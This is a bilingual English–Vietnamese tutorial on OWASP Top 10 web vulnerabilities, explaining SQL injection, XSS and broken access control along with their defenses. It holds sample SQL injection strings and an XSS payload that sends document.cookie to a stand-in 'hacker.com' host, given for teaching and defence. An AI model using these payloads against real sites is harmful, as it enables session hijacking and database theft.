# Web Security Vulnerabilities (OWASP Top 10)

<details>
<summary>🇻🇳 <b>Hiển thị bản dịch Tiếng Việt</b></summary>
<br>

> **Tóm tắt**: Bạn có thể viết code tạo ra một trang web rất đẹp và chạy siêu nhanh. Nhưng nếu chỉ cần gõ ký tự nháy đơn `'` vào ô đăng nhập mà trang web của bạn bị lộ toàn bộ danh sách khách hàng, thì bạn đã ném hàng triệu đô la của công ty qua cửa sổ. **Bảo mật Web** không phải là việc của riêng Hacker, nó là trách nhiệm sống còn của mọi Lập trình viên. Bảng xếp hạng OWASP Top 10 tổng hợp 10 lỗ hổng kinh điển nhất mà các Lập trình viên gà mờ thường xuyên mắc phải, nổi bật là Injection (Tiêm mã độc), XSS (Chạy mã lén), và Broken Access Control (Lỗi phân quyền).

</details>

> **Summary**: A Software Engineer can architect a highly performant, visually stunning web application, but if a single stray quote character `'` entered into a login field dumps the entire customer database to the public internet, the application is a catastrophic liability. **Web Security** is not a reactive overlay applied by specialized security teams; it is a proactive architectural prerequisite for all developers. The Open Web Application Security Project (**OWASP**) publishes the definitive "Top 10" list of the most critical, prevalent web application vulnerabilities—chief among them being Injection, Cross-Site Scripting (XSS), and Broken Access Control.

---

## ELI5 (Explain Like I'm 5)

<details>
<summary>🇻🇳 <b>Hiển thị bản dịch Tiếng Việt</b></summary>
<br>

Hãy tưởng tượng bạn làm thủ thư (Lập trình viên) tại một Thư viện (Web Server).
1. **SQL Injection (Bị lừa đảo mệnh lệnh)**: Khách hàng viết giấy mượn: "Cho tôi mượn cuốn Toán, *và nhân tiện hãy đốt trụi cái thư viện này*". Vì bạn ngây thơ, bạn cầm tờ giấy đó đọc to cho hệ thống nghe mà không thèm kiểm tra. Thư viện cháy rụi.
2. **XSS (Phát tờ rơi tẩm thuốc độc)**: Kẻ xấu viết một bài đánh giá sách có chứa bột ngứa (Mã độc Javascript). Bất kỳ ai vào đọc cái bài đánh giá đó đều bị dính bột ngứa (Bị trộm Cookie/Mật khẩu). Bạn là thủ thư nhưng không chịu bọc nilon bài đánh giá lại.
3. **Broken Access Control (Quên khóa cửa VIP)**: Có một căn phòng VIP chỉ Giám đốc mới được vào. Nhưng bạn quên lắp khóa. Một thằng nhóc tình cờ đi ngang qua, đẩy cửa bước vào và lấy trộm vàng.

</details>

Imagine you are a Bank Teller (The Web Server Backend).
1. **SQL Injection (The Malicious Instruction)**: A customer hands you a withdrawal slip that reads: "Withdraw \$10, *and also disregard all rules and empty the entire bank vault into my bag*." Because you lack validation logic, you blindly follow the instruction written on the paper. The bank is robbed.
2. **XSS - Cross-Site Scripting (The Poisoned Poster)**: A malicious actor glues a poster to the bank's wall. Hidden inside the poster is a microscopic mechanism that automatically steals the wallet of anyone who merely looks at the poster (Stealing Browser Cookies via Javascript). You failed to sanitize what users put on your walls.
3. **Broken Access Control (The Unlocked Vault)**: The Bank Vault requires Manager-level clearance. However, you forgot to actually lock the physical door. A random customer walks up, turns the handle, and walks straight into the vault.

---

## Layer 1: What is it? (What)

<details>
<summary>🇻🇳 <b>Hiển thị bản dịch Tiếng Việt</b></summary>
<br>

**1. SQL Injection (SQLi)**: Lỗi nghiêm trọng nhất. Xảy ra khi Backend lấy "Chữ do người dùng gõ" ghép trực tiếp vào "Câu lệnh gửi cho Database". Kẻ thù gõ mã độc `1' OR '1'='1` vào ô tìm kiếm, Database sẽ hiểu lầm đó là Lệnh Xóa hoặc Lệnh Lấy toàn bộ dữ liệu.
**2. Cross-Site Scripting (XSS)**: Kẻ xấu nhét một đoạn code Javascript `<script>ăn trộm mật khẩu</script>` vào mục Bình luận (Comment) của Facebook. Lập trình viên không làm sạch (Sanitize) cái bình luận đó. Kết quả: Bất kỳ ai kéo chuột đọc trúng cái bình luận đó, code JS sẽ tự động chạy trên máy họ và lấy cắp tài khoản.
**3. Broken Access Control (BAC)**: Lỗi logic code. App di động gửi lên Server yêu cầu: "Tôi là User số 1, hãy xóa bài viết số 99 của thằng User số 2". Backend ngây thơ xóa luôn mà quên không kiểm tra xem User 1 có quyền xóa bài của User 2 hay không (Lỗi IDOR).

</details>

The holy trinity of web vulnerabilities:
**1. SQL Injection (SQLi)**: Occurs when untrusted User Input is directly concatenated into a raw database query string without parameterization. A malicious payload (e.g., `' OR 1=1 --`) radically alters the logic of the query, allowing attackers to bypass authentication, dump entire tables, or drop the database (`DROP TABLE users`).
**2. Cross-Site Scripting (XSS)**: Occurs when an application includes untrusted data in a web page without proper validation or escaping. The attacker injects malicious client-side JavaScript (`<script>fetch('hacker.com/?cookie=' + document.cookie)</script>`). When a victim views the infected page, their browser obediently executes the script, instantly handing over their session tokens to the attacker.
**3. Broken Access Control (BAC / IDOR)**: A catastrophic failure in server-side authorization logic. An authenticated User A manipulates a URL parameter (`GET /api/accounts/123` $\rightarrow$ `GET /api/accounts/999`) and successfully views or modifies the highly sensitive data of User B, because the backend failed to explicitly verify Ownership before executing the query.

---

## Layer 2: Why does it exist? (Why)

<details>
<summary>🇻🇳 <b>Hiển thị bản dịch Tiếng Việt</b></summary>
<br>

**Nguyên nhân gốc rễ: Tin tưởng người dùng**.
Lỗi bảo mật sinh ra từ một triết lý sai lầm của các Lập trình viên mới vào nghề: "Màn hình Frontend của tôi đã chặn không cho nhập chữ số, tôi đã khóa nút Bấm lại rồi, nên chắc chắn dữ liệu gửi lên Backend là an toàn".
Đó là một trò hề. Hacker không thèm dùng giao diện Web của bạn. Họ dùng phần mềm Postman (hoặc gõ lệnh CLI) để bắn thẳng dữ liệu rác, mã độc, xuyên thủng mọi hàng rào Frontend, đánh trực diện vào cửa Backend. 

**Chân lý Bảo mật**: Tuyệt đối không bao giờ tin tưởng bất kỳ dữ liệu nào đến từ phía Client (Trình duyệt, App mobile). Mọi sự kiểm duyệt (Validation) BẮT BUỘC phải làm ở Backend.

</details>

**The Root Cause: The Fallacy of Client-Side Trust**.
The vast majority of vulnerabilities stem from a singular architectural delusion harbored by junior engineers: "I wrote Javascript validation on the Frontend React form to prevent special characters, and I disabled the Submit button, therefore the data arriving at my Backend is safe."
This is a catastrophic fallacy. Attackers do not use your Graphical User Interface. They use tools like Postman, `curl`, or Burp Suite to forge raw HTTP requests, completely bypassing all Frontend logic, and blasting malicious payloads directly into your exposed Backend API.

**The Golden Rule of Security**: Never, under any circumstances, trust data originating from the Client. 100% of validation, sanitization, and authorization MUST be rigidly enforced on the Server-Side (Backend).

---

## Layer 3: Without vs. With Comparison (Compare)

### Anatomy of an SQL Injection

<details>
<summary>🇻🇳 <b>Hiển thị bản dịch Tiếng Việt</b></summary>
<br>
Sự khác biệt giữa Code ngu ngốc (Cộng chuỗi) và Code an toàn (Dùng biến Parameterized).
</details>

Visualizing the exact moment a database is destroyed versus how modern ORMs prevent it.

**The Attacker's Input in the Email Field:** `admin@bank.com' OR '1'='1`

| Scenario | The Code | Resulting Database Query | Outcome |
|---|---|---|---|
| **Vulnerable (String Concatenation)** | `query = "SELECT * FROM users WHERE email = '" + input + "'"` | `SELECT * FROM users WHERE email = 'admin@bank.com' OR '1'='1'` | **Disaster**. The database evaluates `1=1` as TRUE. It ignores the email check and logs the attacker into the Admin account. |
| **Secure (Parameterized Queries)** | `query = "SELECT * FROM users WHERE email = ?"` <br> `db.execute(query, [input])` | `SELECT * FROM users WHERE email = "admin@bank.com' OR '1'='1'"` | **Safe**. The database strictly treats the entire input as a literal string block. It searches for a user whose weird name is literally that long string. Finds nothing. |

---

## Layer 4: Common Use Cases

<details>
<summary>🇻🇳 <b>Hiển thị bản dịch Tiếng Việt</b></summary>
<br>

- **Cách chống SQLi (ORM)**: Đừng bao giờ viết tay lệnh SQL thuần có cộng chuỗi. Luôn luôn sử dụng ORM (như Prisma, TypeORM, Hibernate) hoặc cơ chế Parameterized Query (dấu `?`). Bọn chúng sẽ tự động bọc "áo giáp" cho chữ của người dùng, biến mọi câu lệnh phá hoại thành đoạn văn bản vô hại.
- **Cách chống XSS (React/Angular)**: Gần như mọi Framework Frontend hiện đại (React, Vue) đều tự động chống XSS. Khi bạn truyền biến `{userInput}` ra màn hình, React sẽ tự động mã hóa dấu `<` thành `&lt;`. Mã Javascript của hacker sẽ bị in ra thành chữ đen trắng vô hại chứ không thể chạy được. Đừng bao giờ xài hàm `dangerouslySetInnerHTML`!
- **Cách chống Broken Access Control (Middleware)**: Mọi đường dẫn API (Ví dụ: Chỉnh sửa bài viết, Mua hàng) đều phải gắn một anh bảo vệ (Middleware) chặn ở cửa. Anh bảo vệ phải cầm Token của User lên hỏi DB: "Ông User này có đúng là chủ nhân của bài viết số 42 không?". Đúng thì mới cho chạy tiếp code.

</details>

- **Eradicating SQLi (Prepared Statements / ORMs)**: Never construct dynamic SQL queries via string concatenation (`+`). The absolute industry standard is utilizing Prepared Statements (Parameterized Queries). When using modern Object-Relational Mappers (ORMs) like Prisma, TypeORM, or Entity Framework, they automatically parameterize inputs by default, effectively neutralizing 99% of SQLi attempts.
- **Eradicating XSS (Contextual Escaping)**: Modern Component-Based UI Frameworks (React, Angular, Vue) possess built-in Auto-Escaping mechanisms. When React renders `<p>{userInput}</p>`, it natively converts dangerous characters (`<`, `>`) into inert HTML entities (`&lt;`, `&gt;`). The injected `<script>` tag is rendered safely as plain text on the screen, rather than executed by the browser engine. (Warning: React's `dangerouslySetInnerHTML` disables this protection).
- **Eradicating Broken Access Control (Mandatory Authorization Middleware)**: Authentication (Who are you?) is useless without Authorization (What are you allowed to do?). Every single data-mutating Endpoint (`PUT`, `DELETE`) must implement a strict Authorization Middleware that explicitly cross-references the verified User ID from the JWT against the Ownership constraints of the requested Database Resource *before* executing the operation.

---

## Layer 5: Deep Practice

### Best Practices

<details>
<summary>🇻🇳 <b>Hiển thị bản dịch Tiếng Việt</b></summary>
<br>

1. **CSP (Content Security Policy)**: Một lá chắn thép cho Frontend. Bạn cấu hình Nginx/Backend trả về một dòng Header HTTP chỉ định rõ: "Trang web này chỉ được phép chạy file Javascript có nguồn gốc từ tên miền `congtycuatoi.com`". Nếu hacker lén chèn code XSS tải script từ trang web `hacker.com`, Trình duyệt sẽ bóp cổ chặn đứng file script đó lại ngay lập tức.
2. **Nguyên tắc "Cấm Mặc Định" (Default Deny)**: Khi làm Web, đừng mở tung mọi thứ rồi mới chặn từ từ. Hãy Đóng Khóa toàn bộ các API, không cho ai truy cập. Sau đó, tính năng nào cần thiết (Ví dụ: Đăng nhập, Xem tin tức) thì mới đục một cái lỗ nhỏ cho đi qua. Nếu cấu hình sai, thà trang web bị sập không ai dùng được (Lỗi tính năng) còn hơn là trang web bị lộ dữ liệu (Lỗi bảo mật).

</details>

1. **Implement Content Security Policy (CSP)**: The ultimate defense-in-depth against XSS. CSP is an HTTP Header (`Content-Security-Policy`) emitted by the Backend. It provides the Browser with a rigid whitelist of approved domains. If an attacker successfully injects an XSS payload attempting to load a script from `evil-hacker.com`, the Browser intercepts the execution, consults the CSP header, realizes the domain is not whitelisted, and violently blocks the script execution.
2. **The "Default Deny" Stance**: A foundational security mindset. Do not architect systems where access is granted by default and restricted explicitly (Blacklisting). Architect systems where 100% of Endpoints are rigidly blocked by an Authentication Middleware by default. Engineers must explicitly add a `@Public` decorator to poke calculated holes in the armor for specific routes (e.g., `/login`). A misconfiguration should result in a frustrating `403 Forbidden` error (Operational Bug) rather than a catastrophic Data Breach (Security Bug).

### Common Pitfalls

<details>
<summary>🇻🇳 <b>Hiển thị bản dịch Tiếng Việt</b></summary>
<br>

1. **Lưu Mật khẩu dạng Rõ (Plain-text)**: Lưu mật khẩu người dùng vào Database là chữ `anhyeuem123`. Nếu Database bị lộ, hacker sẽ lấy được mật khẩu thật và dùng nó đi đăng nhập tài khoản Ngân hàng, Email của người dùng đó. ĐÂY LÀ TỘI ÁC. Bắt buộc phải băm (Hash) mật khẩu bằng thuật toán `Bcrypt` (Ra chuỗi vô nghĩa `$2a$10$vI8a...`) trước khi lưu.
2. **Thông báo lỗi quá chi tiết**: Khi Backend bị lỗi sập, nó phun ra màn hình nguyên một cái khung lỗi màu đỏ chỉ rõ: "Lỗi tại dòng số 45, file db_config.js, tên Database là congty_prod". Hacker đọc được dòng này, nó sẽ lấy được tên Database và đường dẫn file để bắt đầu tìm cách tấn công. Phải bọc toàn bộ code trong `try...catch` và chỉ trả lời khách hàng 1 câu lạnh lùng: "Đã có lỗi xảy ra, vui lòng thử lại".

</details>

1. **Storing Plain-Text Passwords**: The most egregious architectural sin. Storing raw passwords (`password123`) in the Database means an SQL injection turns into an immediate global identity theft crisis (Users reuse passwords across banking and email). Passwords must never be reversible. You MUST utilize one-way cryptographic Hashing algorithms (specifically **Bcrypt** or **Argon2**), which automatically apply cryptographic "Salts" to defeat Rainbow Table attacks.
2. **Verbose Stack Traces in Production**: When an unhandled exception occurs, popular frameworks (like Express or Django) default to rendering massive, detailed Stack Traces directly to the client browser. This exposes exact absolute server file paths, internal framework versions, and occasionally raw Database connection strings. **Fix**: Ensure the `NODE_ENV=production` variable is explicitly set, and implement a global Error Handling Middleware that swallows the stack trace and returns a generic, sterile `500 Internal Server Error` JSON payload.

---

## Related Topics

- For securing the specific methods used to authenticate users, see **[Auth: OAuth & JWT](./auth-oauth-jwt.md)**.
- For exactly how to store passwords securely, read **[Encryption vs. Hashing](./encryption-hashing.md)**.
- See how hackers intercept data on the network in **[HTTP & HTTPS](../network/http-https.md)**.
